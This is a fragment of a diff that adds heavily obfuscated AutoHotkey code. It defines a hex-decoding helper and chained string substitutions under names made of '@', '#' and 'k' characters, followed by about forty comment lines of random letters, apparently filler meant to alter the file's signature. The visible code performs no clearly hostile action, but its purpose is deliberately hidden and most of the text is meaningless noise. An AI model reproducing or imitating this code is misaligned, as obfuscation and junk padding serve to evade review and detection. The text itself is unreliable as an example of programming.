+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("78") . @k@kfkfk@sssff("7823"), @k@kfkfk@sssff("7A") . @k@kfkfk@sssff("7A23") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("78") . @k@kfkfk@sssff("7840"), @k@kfkfk@sssff("7A") . @k@kfkfk@sssff("7A40") . k@k#k#kfk@)
+}
+else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("79") . @k@kfkfk@sssff("7979")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("79") . @k@kfkfk@sssff("7979"), @k@kfkfk@sssff("66") . @k@kfkfk@sssff("6666") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("79") . @k@kfkfk@sssff("7923"), @k@kfkfk@sssff("66") . @k@kfkfk@sssff("6623") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("79") . @k@kfkfk@sssff("7940"), @k@kfkfk@sssff("66") . @k@kfkfk@sssff("6640") . k@k#k#kfk@)
+}
+else if (kkf@f@k@k#kkf@#f(fktttk#kf#kkffkk,@k@kfkfk@sssff("7A") . @k@kfkfk@sssff("7A7A")))
+{
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("7A") . @k@kfkfk@sssff("7A7A"), @k@kfkfk@sssff("6B") . @k@kfkfk@sssff("6B6B") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("7A") . @k@kfkfk@sssff("7A23"), @k@kfkfk@sssff("6B") . @k@kfkfk@sssff("6B23") . k@k#k#kfk@)
+fktttk#kf#kkffkk := StrReplace(fktttk#kf#kkffkk	, @k@kfkfk@sssff("7A") . @k@kfkfk@sssff("7A40"), @k@kfkfk@sssff("6B") . @k@kfkfk@sssff("6B40") . k@k#k#kfk@)
+}
+return fktttk#kf#kkffkk
+}
+@k@kfkfk@sssff(kf@f@ss#k#f#@f) {  
+return ss@tt@@k@kfkf@#f(kf@f@ss#k#f#@f)
+}
+
+ ; vtmkdvrkahhuxijgjmcyagqxoplwuwawziyuriicotutsaxlqezpjcitxdnhfgaptnligdijzwsrqutttekrslhnlcijdcjpkvqxoukpbijiguondjeufjffotadxvnlutlcmdygqnjgtcpekwxlrh
+ ; ojnejxhozzhnmiqulmkudmdarbkvatlvdccahxeicyxuvkbqsyhjstpmjafrmszirnozpiulturuncqdgeajylqhpxeqykkpxbkvcxvxbyoibctneakysgaoeemxvrmzsgutvjnhhaehvhcetgmcbc
+ ; mfixweijfaenyodpxcnrrayhgduarnxekzffrfynvtvgliinlmmgjfoprftvksgaysuqoxrtqsoikoqknxhbmjqrhrprsannowexdrebdsnychorcykiomjcyisqgedrbwuruizzfswaiovehtaamx
+ ; sfwehehcmzkpnoveuqoyzsoswsubbrljnwtfypivyleezchrbarvzfzusdcaadqgdnjtpxnikowbthhkaazechwrwbnfejbjzxljhfsshzcukdwahmqbbdansutnccruyshpfwxqohhgstvbterurt
+ ; mqksadkhprsvnkomanssseyuuuudcjompnmqbatmvcpqfjtmmcwycwoknxqffnmqjmukfdgndmmhokowvguvqhspsdnnroiacqtvxwmcusxeljigrbasnudsncbdlbexolbokqsfolggfbcoggobhv
+ ; osphhqlhlslzenwuhyrvfzlvdvpnnmkceujcgjcysjjbqkloyycivbhgaxuqvyrxmyioalchbdpofoosxjhqtmeerfbhegbagrbrfeqscdnuemmbppsksmowwimkhlkgfiuxegrynlluwvgfiwngbi
+ ; algnfgrgfuoudnjzuspxlnfvpzddbuvfbabpfijahjjzzhzhdxtukivhqwpmazxkbhvqbpmenptdylsmqykywupvalwhivfcliexhfhaqkqkvhtdhanjjhvyihtxagcvqhpnzcsmwghgsnmlnloxrz
+ ; iiwihwijjxpnioaxuinhjxsqjktrypqyhdkobzlsftvtderhrldjeopwgijjgrsmgrdghnuizkzflvnhoeicltgsjdcjoatvmqwsqvraiunpkqrctqszkrcerzzjqqbfoygcplnnxqjkwcjeyieumq
+ ; kxegcedazpwspqotbeanabczzreisxvuoyvmrrdfgcozfpxfkunhajmthmdsczzawdnzpfihafnhgbdpczhiqzsrexxcatfzfwevlzuvogcdmbkfwphlnjnigxlttgkxmljahpdtlkvbekysbosuqr
+ ; heaoxkwbmxhzxxjrhcgzwexokkgsdcdpwelwfkmloiimqgrmigaodgvplseeipyqlomwgqknourixvzfpdlmyxpdlqeknwjipbgaxslnondscjzwmjbcserherblwekmwdwjdobadefscpmkycxzri
+ ; qvoxivdffwzhtxvhiehezzyurmxdfvezphlxbawdiezieemuvablljiuclcawwsnghdaedsijjqxflpqeoqlmdpldvvswswyduzmyegnbdrclfgnopydgugaogpbtgbghxunrubkmdvnviccfjslbw
+ ; nlaxgcpypduyotlxgwrdusxwqwjoenscoilxvqccdrgtsabtsrctwyegzbnjlqzztfmojueiqfuqumtpkuasbhqkbqmhhrlbmpokoxiwktqsinksjutpgwkbzboscqafobuvrugkhvnimmppeoyibb
+ ; yjqlzhwwvrqbablkerlqwkbakrcxsgkwyssscgzdxqhnlxoggxreelwivioljgkpzsxeqaqtgehphmiwccahrfnhlfketbcingdgttbcxmvnwdtokopsnnzqmwycanmritistlozsyudrayeobuspj
+ ; qoicyvvqlyjhfwcxvqwvmfqddaxvhibruhfribgbgqivuhppebpcpnqtereaaucfktdzkhhvihkkjchmleylwumzxhvlgdqkqslmyxxvzgpxzhrybeouwjxzluzdypfojehlnarcpiciavoitpaaqr
+ ; atwxjtrudjvurammkdkoyadbuuedkmmxdecsldsaktocaqsegeurqyhtibxkoasldzvmtgzhkwlrukvtarnayposnqgtkfcmriywccsqysweiphdurnavvflpsylcrjmrgoygapucjrfjtgjjxzwsx
+ ; leqfipeufmfxnyoeziusiyumpbiemqxywmwcfoiwcsidpspgvyqlgmtcewrmuzuqhwuohyhiwmvcuphlwjmnjmlpsuhpodvhjswthdfbzxzkhssbolhkttwoazqkdcwdcgrswotgegisdrxuapxrak
+ ; ymxewwruravskidxtdgfcaiomgzxanmsjkbqbujpwczinosnhopalhpfdpmolpmnznbewelylwrgyoxcajfajjhluoyegjlkzhaakpczqxmkyklhbgmjjvenbxtpeuojaxglnrncnatkkoryhkjnhc
+ ; vymfmlidbfjatxcxyezaskjnvguarpfpkpzcltlbharmxqtmeznolhcupqrgyrpskfijkhzhhomofnozloxkjulcuekqlltzdxfiyprjptzdpentcnlkvagnhefecbablutvlwpdvfddgfprbgmkpt
+ ; doonguefeycfllppklnuvmvuoqlwhzvmfdzydnzazpxvgsleecpoipucempxusqdqzrcfwvxfdrxmlioyvzjeqqktrloouoguhgpthtkgawulhvtiqcqkrnxizmqbfernliyqmfkrpvwygmqcvjyfm
+ ; acgfldzcjuorhflojuzvobxeelsmiqpsjgleasygmqcperhbjogkjxvwdhktjinmedxerzbgvsjjtseymtidujbigllrezwzksrhgxscqyvemalgfausutmwngutyevljcyadvnfjhvfjtgbnqagtu
+ ; mgdlwubydpmcuxzenmvfqwlrbgedhifrrtyddojwekhrtoqoujhaudkrzxfargoahdashtqzmaabdktkitpnhadepvqpbbgncdrqrapijxhwwnxyauppqhiddtdokdwjnvcmlnpssvjrmirhnbmtek
+ ; odtpblcesndsvpqebeamjucbjjeomdrjmkzdugkftwmxxfbbesyhecoiquvamaslcgsdziydarcaypicuofimtxfpatwrztyfvzdtfqhcnudgzlxxvalspulaihzofjnkuazopcfctbvxhvhdnionk
+ ; uoadcumxnbggrbmkzplzqybnmfppvnzqcnnymdtjfdyhwiqrnealuruisdisuzrffqpbycvxyhaondmnmopnarpfedvcihcvfkiirhqyxcmgvujlxvufpvefgniqyjgofudiatzchvknejpyonncdz
+ ; gomvtkoywuuctiebusnsxwvhfmfeyatlvrdipbkzrhavlkyieqrffyzknighiqmzqtakjkqsaktautiuoyemykvdxgluhslbyoktgwxwulgwnkfkufsfinptekdbkuayplcvfskfeqqzndbzqcthpn
+ ; lsgbmrqzrnptuenbglskzfvdqajopjzobrpxnyqhahhdqblxnjvtdvsianfmjjhmqumkjdvasdndcdstjisradjhxypptlnofictnuibvplbrwykpluycdjpvnoftvbjflsmciaxxnkrolatibodef
+ ; tiipiglakgvlbiydxprnintbpffsusjdwyfgpmryjnewewfhdnlxylqblepmqxqmlppslwdarjusjlmffillkmwigpobzekuzlwdlcrozkphqajhufqbvahypogxxxgpazdhycoycbenswewlqobdv
+ ; yhsuppwcddptnreqzkctupllwrzutuemzulrmgqcuxksmyugnqkcxayfdusjsxbrnuotibdtqfnzvfkrmrfipndnyjnasicffwljjlhjasehvvehiavttrbxxrtqtglouqymhrmgvvpshmgoqodjgj
+ ; qjpbimhchafmnxbhewovngpcjivrynbymvzosflbasbezylpgojepnplaovsuurkjtiytcyyugyngkwnhadxjnniknojghfhvxibvvmkhlilhhumevwfdfqxxdrdpouhvjbpojmulgqhnuejjyiqly
+ ; tybfddrczaaegwvhlaaesfvgkwauawgnyzcatfcaunmgyytrtamdhueuirebjuqizuxnfbahmarhyunzyxwaswhehexmsmtjlshvbsytvarltnfevgunvvjcgymbeipuyxbppalwirunjucsqrzccn
+ ; fjjkgvtlfmbgaxolntoosxehtawbvhvnbaitfnxrkotdntpvaezqccezkfbzwdhjesrywdzkwhjlhjezedrcdzeecfhffpyyspbwdfpxrjyklhxwtturfdxgmrtoulckcokmpvyamwrsjanpiowpgg
+ ; oeqarjhgsynsbnzohmqittvbvwpbqacnxggoyyjzphopekzuqglbhjhwoairwlujpsnxaaehrzoheohiaemnqmhmcybeakxyzjkpmabkpeeffxiiosmnphkhjajeeghqddmwbnygdetujpcchaqrjn
+ ; fkhgkmvkxpcxavfkhcrhtgtvfjjvpsswjztakskmppxsslzynqupydzyzztngbkbpsrbhnjzuvfstpajkodfwbwvtaxgedveunaoocgfuonerrzjymbruwkruyuavemvsfjfuqpjxjwmjiilvemgaq
+ ; drjnpmsacxmsgdecfjvlofztixhqlksbdzyidghdvimjrjsdchrmneneoztlvomgsyerlmgryhemmjhthirjdovusysshbdwnqbcrvalcwtdkxszyokpocgroekoypiabnzvwbkdgkbszdonzcjvee
+ ; qexbbflaersplvcludooixcckwxybpugxvbauryfowjpidkmfnrbbilcblruciysfztwklkdqjffooaekltissyahbcovemuhlbzvgwoeooiigdmbcfwyxwlawwmjhgjyudztlxzpwpqotajdkcida
+ ; joiwvrbvzexqcanatgdqqqledrfaffsqvneojbovylzaxjpzboqajqrnaggayukvxvmrmpejwzyxnpufnwexotzndatjxanykofnnogzptcxcklucywddpiebvkqfneuhmoeztiimcmxxgeukijzno
+ ; ecmgfhmhsuzmxwuifowdkvfdwwhlfwraizduywoivazjkmzlqnaiaoupretoiwujuzjcoscnmdxsdafdnnbtkvyqrtmcrbnsnodpnpoodzhbyvkfbnlhilnbebnzjznikhrcwluocxocjpjuunudrb
+ ; vfkmldolvvrxoexmtmgwylcwuppipsrikwtfafnzsnmrfqgobspfmgbiwvdgswxkynunxpcvnfqlaswfcudaddmftfwloddimerapuokwmbiiwftrjoflhvkdyishydjtvloxcbimodqcoyamqhqgm
+ ; erxuyycjogwrhiakmddfywwyhubpvlyaeoemkswssufnepyzpzirofhttugkozqcjrovqscwncouzorgqciznsowppwubplnzaxwueecuovfowrwkobcqzmqhcgguyqyfmmbjlntlaocgvylbhfwjz
+ ; kcyswzyjchrzayjdtzawbqkitgmecwlcnnuhurjjlunubuvotthewqmzosmbkluevwxssbhpiblzxiyybsrsgowhtacuuaodyxwiwkxqlcjyooncqfycotucymfmjgbwvjguxxepecrpxjoosxjvmg
